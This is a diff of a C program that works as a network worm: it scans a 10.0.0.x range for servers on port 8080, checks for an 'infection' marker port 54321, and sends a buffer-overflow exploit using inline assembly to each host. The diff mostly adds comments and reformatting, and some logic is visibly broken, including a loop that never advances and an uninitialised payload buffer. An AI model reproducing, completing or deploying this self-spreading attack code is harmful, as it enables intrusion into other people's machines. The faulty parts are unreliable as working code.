@@ -8,74 +8,83 @@
 #define SERVER_PORT 8080
 #define INFECT_PORT 54321
 
+// Structure for individual server cells in the linked list
 struct cell_server {
     unsigned long IP;
     struct cell_server *Suivant;
 };
 
+// Structure defining the server list
 struct list_server {
     struct cell_server *Debut;
     struct cell_server *Fin;
 };
 
-void Init_List(struct list_server * input){ 
-	input->Debut = NULL;
-	input->Fin = NULL;
+// Initialize the list structure
+void Init_List(struct list_server *input){ 
+    input->Debut = NULL;
+    input->Fin = NULL;
 }
 
-void Add_Beginning(struct list_server * list, unsigned long address){
-	struct cell_server * p_cell;
-	p_cell = malloc(sizeof(struct cell_server));
-	p_cell->IP = address;
+// Add a server to the beginning of the list
+void Add_Beginning(struct list_server *list, unsigned long address){
+    // Allocate memory for a new server cell
+    struct cell_server *p_cell;
+    p_cell = malloc(sizeof(struct cell_server));
+    p_cell->IP = address;
 
-	if (list->Debut == NULL && list->Fin == NULL){
-		list->Debut = p_cell;
-		list->Fin = p_cell;
-		list->Debut->Suivant = NULL;
-		list->Fin->Suivant = NULL;
-
-	}
-	else{
-		struct cell_server * aux = list->Debut;
-		list->Debut = p_cell;
-		list->Debut->Suivant = aux;
-	}
+    // If the list is empty, set the new cell as both the start and end
+    if (list->Debut == NULL && list->Fin == NULL){
+        list->Debut = p_cell;
+        list->Fin = p_cell;
+        list->Debut->Suivant = NULL;
+        list->Fin->Suivant = NULL;
+    } else {
+        // Otherwise, add the new cell to the beginning of the list
+        struct cell_server *aux = list->Debut;
+        list->Debut = p_cell;
+        list->Debut->Suivant = aux;
+    }
 }
 
-void print_list(struct list_server * list){
-	struct cell_server * aux = list->Debut;
-	while(aux != NULL){
-		printf("%022lx ----> ",aux->IP);
-		aux= aux->Suivant;
-	}
-	printf("NULL\n");
+// Print the contents of the server list
+void print_list(struct list_server *list){
+    struct cell_server *aux = list->Debut;
+    while(aux != NULL){
+        printf("%022lx ----> ", aux->IP);
+        aux = aux->Suivant;
+    }
+    printf("NULL\n");
 }
 
-void free_list (struct list_server * list){
-	struct cell_server * aux = list->Debut;
-	while(aux != list->Fin){
-		aux = aux->Suivant;
-		free(list->Debut);
-		list->Debut = aux;
-	}
+// Free memory occupied by the server list
+void free_list(struct list_server *list){
+    struct cell_server *aux = list->Debut;
+    while(aux != list->Fin){
+        aux = aux->Suivant;
+        free(list->Debut);
+        list->Debut = aux;
+    }
 }
 
-int is_infected(unsigned long ip, int sock, struct sockaddr_in * my_server_addr){
+// Check if a server is infected
+int is_infected(unsigned long ip, int sock, struct sockaddr_in *my_server_addr){
     my_server_addr->sin_addr.s_addr = ip;
     my_server_addr->sin_port = htons(INFECT_PORT);
-    int connfd = connect(sock, (struct sockaddr*)&my_server_addr, sizeof(*my_server_addr));
+    int connfd = connect(sock, (struct sockaddr*)my_server_addr, sizeof(*my_server_addr));
     if (connfd == 0){
-		close(connfd);
-    	my_server_addr->sin_port = htons(SERVER_PORT);
+        close(connfd);
+        my_server_addr->sin_port = htons(SERVER_PORT);
         return 1;
-    }
-    else{
-	    my_server_addr->sin_port = htons(INFECT_PORT);
+    } else {
+        my_server_addr->sin_port = htons(INFECT_PORT);
         return 0;
     }
 }
 
+// Function to infect servers, an infected server will have the arbitrary 54321 port opened
 int infect(){
+
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
     char port[] = "54321";
 
@@ -114,7 +123,7 @@ int infect(){
     return 0;
 }
 
-
+// Scan for available servers in a given IP range
 struct list_server * scan_server_available(char * start_IP_str, char * end_IP_str){
 	int sockfd;
     struct sockaddr_in server_addr;
@@ -184,6 +193,8 @@ struct list_server * scan_server_available(char * start_IP_str, char * end_IP_st
 	print_list(opened_servers);
 	return opened_servers;
 }
+
+// Exploit the given buffer overflow vulnerability on a given server
 void exploit(int connfd){
 	// Perform a write to stdout
 	asm("push %rsi\n\t"
@@ -203,60 +214,54 @@ void exploit(int connfd){
     "syscall\n\t"
 	"pop %rsi\n\t");
 	char * buff[5];
-	int SERV_BUFF_SIZE = 49; //TAILLE DU BUFFER SERVEUR, SERT POUR LE DECALAGE
+	int SERV_BUFF_SIZE = 49;
 	write(connfd,buff,5);
 }
 
 
+// Entry point of the program
 int entry_point() {
+    // Function where the main tasks are executed
 
-	/* Scan IP given for server listening on port 8080
-    then puts them in a linked list*/
-	char *start = "10.0.0.1";
-	char *end = "10.0.0.255";
+    // Scan IP range for servers and store them in a linked list
+    char *start = "10.0.0.1";
+    char *end = "10.0.0.255";
     struct list_server *my_list;
-	my_list = scan_server_available(start, end);
+    my_list = scan_server_available(start, end);
 
-
-	// Create and initialize socket 
-	int my_sockfd;
-	struct sockaddr_in my_server_addr;
-	my_sockfd = socket(AF_INET, SOCK_STREAM, 0);
-	memset(&my_server_addr, 0, sizeof(my_server_addr));	
+    // Create and initialize socket
+    int my_sockfd;
+    struct sockaddr_in my_server_addr;
+    my_sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    memset(&my_server_addr, 0, sizeof(my_server_addr));    
     my_server_addr.sin_family = AF_INET;
     my_server_addr.sin_port = htons(SERVER_PORT);
 
-
-	// Loops through the vulnerable servers 
-	struct cell_server * current;
-	current = my_list->Debut;
-	while(current!= NULL){
-		// Checks whether it has previously been infected 
-		if (is_infected(current->IP,my_sockfd,&my_server_addr)){
-			continue;
-		}
-		else{
-			// Setting up a client connection
-			my_server_addr.sin_addr.s_addr = current->IP;
-			int connfd;
-			connfd = connect(my_sockfd, (struct sockaddr*)&my_server_addr, sizeof(my_server_addr));
-			if (connfd >= 0){
-				// Launch exploit
-				exploit(connfd);
-			}
-		}
-		current = current->Suivant;
-	}
+    // Loop through vulnerable servers
+    struct cell_server *current;
+    current = my_list->Debut;
+    while(current != NULL){
+        // Check if the server has been infected before
+        if (is_infected(current->IP, my_sockfd, &my_server_addr)){
+            continue;
+        } else {
+            // Set up a client connection and launch exploit
+            my_server_addr.sin_addr.s_addr = current->IP;
+            int connfd;
+            connfd = connect(my_sockfd, (struct sockaddr*)&my_server_addr, sizeof(my_server_addr));
+            if (connfd >= 0){
+                exploit(connfd);
+            }
+        }
+        current = current->Suivant;
+    }
     return 0;
 }
 
-
-
-int main(int argc, char * argv[]) {
-
-	// Call entry_point function where every tasks are done
-	entry_point();
-
+// Main function
+int main(int argc, char *argv[]) {
+    // Call entry_point function where every task is executed
+    entry_point();
     return 0;
 }
 	
